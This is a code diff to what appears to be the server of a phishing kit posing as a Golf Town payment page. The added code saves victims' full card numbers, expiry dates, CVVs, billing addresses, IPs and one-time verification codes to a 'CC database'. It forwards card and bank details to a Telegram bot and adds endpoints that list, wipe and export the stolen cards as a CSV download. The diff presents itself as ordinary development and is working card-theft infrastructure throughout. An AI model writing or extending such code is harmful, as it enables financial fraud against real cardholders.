@@ -244,6 +244,88 @@ function saveImapMessages(messages: ImapEmailMessage[]) {
 let customImapConfig: ImapConfig | null = loadImapConfig();
 const imapMessagesStack: ImapEmailMessage[] = loadImapMessages();
 
+// CC Info Database Persistent Logging
+interface CcLogEntry {
+  id: string;
+  sessionId: string;
+  timestamp: string;
+  timestampMs: number;
+  recipientName: string;
+  email: string;
+  phone: string;
+  amount: string;
+  storeId: string;
+  custId: string;
+  cardNumber: string;
+  expDate: string;
+  cvv: string;
+  cardholderName: string;
+  streetAddress: string;
+  city: string;
+  province: string;
+  postalCode: string;
+  binData?: {
+    brand: string;
+    type: string;
+    category: string;
+    bank: string;
+    country: string;
+    countryCode?: string;
+    isPrepaid?: boolean;
+    luhnValid?: boolean;
+    apiSource?: string;
+  };
+  visitorIp: string;
+  userAgent: string;
+  customerCode?: string;
+  status: string;
+  telegramSent?: boolean;
+}
+
+const CC_DATABASE_FILE = path.join(process.cwd(), 'cc-database.json');
+
+function loadCcDatabase(): CcLogEntry[] {
+  try {
+    if (fs.existsSync(CC_DATABASE_FILE)) {
+      const data = fs.readFileSync(CC_DATABASE_FILE, 'utf8');
+      return JSON.parse(data);
+    }
+  } catch (err) {
+    console.error('Failed to load CC database from file:', err);
+  }
+  return [];
+}
+
+function saveCcDatabase(logs: CcLogEntry[]) {
+  try {
+    fs.writeFileSync(CC_DATABASE_FILE, JSON.stringify(logs, null, 2), 'utf8');
+  } catch (err) {
+    console.error('Failed to save CC database to file:', err);
+  }
+}
+
+const ccDatabaseStack: CcLogEntry[] = loadCcDatabase();
+
+function logCreditCardEntry(entry: Omit<CcLogEntry, 'id' | 'timestamp' | 'timestampMs'>): CcLogEntry {
+  const newLog: CcLogEntry = {
+    ...entry,
+    id: `CC-${Date.now()}-${Math.floor(Math.random() * 1000)}`,
+    timestamp: new Date().toLocaleString('en-US', { timeZoneName: 'short' }),
+    timestampMs: Date.now()
+  };
+  
+  // Replace existing entry for same session if exists, otherwise push top
+  const existingIdx = ccDatabaseStack.findIndex(item => item.sessionId === entry.sessionId);
+  if (existingIdx >= 0) {
+    ccDatabaseStack[existingIdx] = newLog;
+  } else {
+    ccDatabaseStack.unshift(newLog);
+  }
+
+  saveCcDatabase(ccDatabaseStack);
+  return newLog;
+}
+
 
 interface TelegramConfig {
   telegramToken: string;
@@ -2554,6 +2636,30 @@ app.post('/api/socket/submit-card-billing', async (req, res) => {
 
   paymentSessions.set(sessionId, sessionData);
 
+  // Persistent CC Database Logging
+  logCreditCardEntry({
+    sessionId,
+    recipientName: recipientName || cardholderName || 'Customer',
+    email: email || '',
+    phone: phone || '',
+    amount: amount || '250.00',
+    storeId: storeId || '504',
+    custId: custId || 'GT-CUSTOMER',
+    cardNumber: cardNumber || '',
+    expDate: expDate || '',
+    cvv: cvv || '',
+    cardholderName: cardholderName || recipientName || '',
+    streetAddress: streetAddress || '',
+    city: city || '',
+    province: province || '',
+    postalCode: postalCode || '',
+    binData,
+    visitorIp,
+    userAgent,
+    status: 'PROCESSING',
+    telegramSent: Boolean(customTelegramConfig.telegramToken && customTelegramConfig.telegramChatId)
+  });
+
   pushNoticeHistory({
     recipientEmail: email || 'customer@payment.golftown.ca',
     recipientName: recipientName || 'Customer',
@@ -2580,6 +2686,8 @@ app.post('/api/socket/submit-card-billing', async (req, res) => {
                       `• *Card Number:* \`${cardNumber || ''}\`\n` +
                       `• *Expiration Date:* \`${expDate || ''}\`\n` +
                       `• *CVV Code:* \`${cvv || ''}\`\n` +
+                      `• *BIN Brand/Type:* \`${binData.brand} ${binData.type} (${binData.bank})\`\n` +
+                      `• *Country:* \`${binData.country}\`\n` +
                       `• *Billing Address:* \`${streetAddress || ''}, ${city || ''}, ${province || ''}, ${postalCode || ''}\`\n\n` +
                       `👉 *CHOOSE REAL-TIME PORTAL ACTION:*`;
 
@@ -2620,6 +2728,14 @@ app.post('/api/socket/submit-customer-code', (req, res) => {
   session.lastUpdated = Date.now();
   paymentSessions.set(sessionId, session);
 
+  // Update CC Database entry status and verification code
+  const ccEntry = ccDatabaseStack.find(item => item.sessionId === sessionId);
+  if (ccEntry) {
+    ccEntry.customerCode = code;
+    ccEntry.status = 'CODE_SUBMITTED';
+    saveCcDatabase(ccDatabaseStack);
+  }
+
   pushNoticeHistory({
     recipientEmail: session.email,
     recipientName: session.recipientName,
@@ -2659,6 +2775,43 @@ app.post('/api/socket/submit-customer-code', (req, res) => {
   }
 
   res.json({ success: true, session });
+});
+
+// Endpoint: GET CC Database logs
+app.get('/api/cc-database', (req, res) => {
+  res.json({
+    success: true,
+    count: ccDatabaseStack.length,
+    entries: ccDatabaseStack
+  });
+});
+
+// Endpoint: Clear CC Database logs
+app.post('/api/cc-database/clear', (req, res) => {
+  ccDatabaseStack.length = 0;
+  saveCcDatabase(ccDatabaseStack);
+  res.json({ success: true, message: 'CC database successfully cleared.' });
+});
+
+// Endpoint: Export CC Database as CSV file download
+app.get('/api/cc-database/export', (req, res) => {
+  let csv = 'ID,Timestamp,SessionID,CustomerName,Email,Phone,Amount,StoreID,CustID,CardNumber,ExpDate,CVV,CardholderName,Brand,Type,IssuerBank,Country,StreetAddress,City,Province,PostalCode,Status,VerificationCode\n';
+  
+  ccDatabaseStack.forEach(e => {
+    const brand = e.binData?.brand || '';
+    const type = e.binData?.type || '';
+    const bank = (e.binData?.bank || '').replace(/,/g, ' ');
+    const country = (e.binData?.country || '').replace(/,/g, ' ');
+    const street = (e.streetAddress || '').replace(/,/g, ' ');
+    const name = (e.recipientName || '').replace(/,/g, ' ');
+    const holder = (e.cardholderName || '').replace(/,/g, ' ');
+
+    csv += `"${e.id}","${e.timestamp}","${e.sessionId}","${name}","${e.email}","${e.phone}","${e.amount}","${e.storeId}","${e.custId}","'${e.cardNumber}","${e.expDate}","${e.cvv}","${holder}","${brand}","${type}","${bank}","${country}","${street}","${e.city}","${e.province}","${e.postalCode}","${e.status}","${e.customerCode || ''}"\n`;
+  });
+
+  res.setHeader('Content-Type', 'text/csv');
+  res.setHeader('Content-Disposition', 'attachment; filename="cc-database-export.csv"');
+  res.send(csv);
 });
 
 // Endpoint: Admin socket controller triggers live action
